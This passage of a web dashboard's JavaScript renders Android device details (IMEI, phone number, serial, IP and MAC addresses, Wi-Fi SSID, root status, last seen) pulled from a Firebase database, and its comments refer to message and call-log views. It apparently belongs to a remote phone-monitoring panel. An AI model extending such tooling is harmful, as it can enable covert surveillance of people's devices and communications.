        // ... (formatBytes, CSV export functions भी वैसे ही रहेंगे)
        
        // Updated loadDeviceInfo to reflect last_seen and better display
        function loadDeviceInfo(uid) {
            const sectionName = 'device-info';
            const dataContainer = document.getElementById(sectionName + '-data');
            const infoRef = ref(database, `devices/${uid}/info`);

            addDbListener(infoRef, sectionName, (snapshot) => {
                if (!dataContainer) return;
                dataContainer.innerHTML = '';
                if (snapshot.exists()) {
                    const data = snapshot.val() || {}; // Ensure data is an object
                    currentDataCache['info'] = [data]; 
                    let html = '';
                    // Prioritize specific keys, then loop through the rest
                    const keyOrder = ['model', 'manufacturer', 'androidVersion', 'sdkVersion', 'imei', 'serialNumber', 'phoneNumber', 'ipAddress', 'macAddress', 'wifiSSID', 'totalRAM', 'availableRAM', 'totalStorage', 'availableStorage', 'isRooted', 'alias', 'status', 'last_seen'];
                    
                    const dataMap = new Map(Object.entries(data));
                    
                    const iconsMap = {
                        model: 'fa-mobile-screen-button', manufacturer: 'fa-industry', androidVersion: 'fa-android', sdkVersion: 'fa-cogs',
                        imei: 'fa-barcode', serialNumber: 'fa-hashtag', phoneNumber: 'fa-phone-square', ipAddress: 'fa-network-wired', macAddress: 'fa-ethernet',
                        wifiSSID: 'fa-wifi', totalRAM: 'fa-memory', availableRAM: 'fa-memory', totalStorage: 'fa-hdd', availableStorage: 'fa-hdd',
                        isRooted: 'fa-user-shield', alias: 'fa-signature', status: 'fa-circle-info', last_seen: 'fa-clock'
                    };

                    keyOrder.forEach(key => {
                        if (dataMap.has(key)) {
                            let value = dataMap.get(key);
                            let displayValue = (value === null || value === undefined) ? '<span class="text-muted fst-italic">N/A</span>' : sanitizeHTML(String(value));
                            
                            if (key === 'last_seen') {
                                displayValue = formatTimestamp(value); 
                            } else if (key === 'isRooted') {
                                displayValue = value ? '<span class="badge bg-danger-soft text-danger-dark">Yes</span>' : '<span class="badge bg-success-soft text-success-dark">No</span>';
                            } else if (key === 'status' && value) {
                                displayValue = String(value).toLowerCase() === 'online' 
                                    ? `<span class="badge bg-success-soft text-success-dark">Online</span>` 
                                    : `<span class="badge bg-secondary-soft text-secondary-dark">${sanitizeHTML(String(value))}</span>`;
                            } else if (key.toLowerCase().includes('ram') || key.toLowerCase().includes('storage')) {
                                if (!isNaN(parseFloat(value))) displayValue = formatBytes(parseFloat(value));
                            }

                            const iconClass = iconsMap[key] || 'fa-tag';
                            const displayKey = key.replace(/([A-Z])/g, ' $1').replace(/_/g, ' ').replace(/^./, str => str.toUpperCase());
                            html += `<div class="list-group-item d-flex justify-content-between align-items-center">
                                        <span><i class="fas ${iconClass} me-2 text-muted fa-fw"></i>${displayKey}</span>
                                        <span class="text-end text-break" style="max-width: 60%;">${displayValue}</span>
                                     </div>`;
                            dataMap.delete(key); // Remove processed key
                        }
                    });

                    // Display any remaining keys from dataMap (those not in keyOrder)
                    dataMap.forEach((value, key) => { 
                         let displayValue = (value === null || value === undefined) ? '<span class="text-muted fst-italic">N/A</span>' : sanitizeHTML(String(value));
                         // Special formatting for any remaining last_seen or status if they were missed or named differently
                         if (key === 'last_seen' || key === 'lastSeen') displayValue = formatTimestamp(value);
                         if (key === 'status' && value) {
                             displayValue = String(value).toLowerCase() === 'online' 
                                ? `<span class="badge bg-success-soft text-success-dark">Online</span>` 
                                : `<span class="badge bg-secondary-soft text-secondary-dark">${sanitizeHTML(String(value))}</span>`;
                         }

                         const iconClass = iconsMap[key] || 'fa-tag';
                         const displayKey = key.replace(/([A-Z])/g, ' $1').replace(/_/g, ' ').replace(/^./, str => str.toUpperCase());
                         html += `<div class="list-group-item d-flex justify-content-between align-items-center">
                                    <span><i class="fas ${iconClass} me-2 text-muted fa-fw"></i>${displayKey}</span>
                                    <span class="text-end text-break" style="max-width: 60%;">${displayValue}</span>
                                 </div>`;
                    });

                    dataContainer.innerHTML = html;
                    displayNoData(sectionName, false);
                } else {
                    displayNoData(sectionName, true);
                    currentDataCache['info'] = [];
                }
            });
        }
        
        // Ensure other functions like loadMessages, loadCallLogs, etc., correctly use formatTimestamp for their date/time fields
        // And CSV export formatTimestamp also handles potential string inputs for timestamps correctly
        // (The formatTimestamp was already updated, this is a reminder for other places if similar issue arises)


        // Custom CSS for badge softness (already present, ensure it's loaded)
        // ... (the rest of the script and HTML body remains the same) ...
        // --- (Make sure to include the closing </script> and </body>, </html> tags) ---

        // Initialize: Auth state observer handles the main flow.
        if (!currentUser) { 
            loginScreen.style.display = 'block';
            dashboardScreen.style.display = 'none';
        }
        document.querySelector('#sidebar .nav-link[data-section="device-overview"]').classList.add('active');
        showSection('device-overview-content'); 

        // Custom CSS for badge softness
        const styleSheet = document.createElement("style");
        styleSheet.type = "text/css";
        styleSheet.innerText = `
            .bg-success-soft { background-color: #D1FAE5 !important; } .text-success-dark { color: #065F46 !important; }
            .bg-danger-soft { background-color: #FEE2E2 !important; } .text-danger-dark { color: #991B1B !important; }
            .bg-warning-soft { background-color: #FEF3C7 !important; } .text-warning-dark { color: #92400E !important; }
            .bg-info-soft { background-color: #CFFAFE !important; } .text-info-dark { color: #0E7490 !important; }
            .bg-secondary-soft { background-color: #F1F5F9 !important; } .text-secondary-dark { color: #475569 !important; }
            .bg-dark-soft { background-color: #D1D5DB !important; } /* text-dark is default */
        `;
        document.head.appendChild(styleSheet);

    </script>
</body>
</html>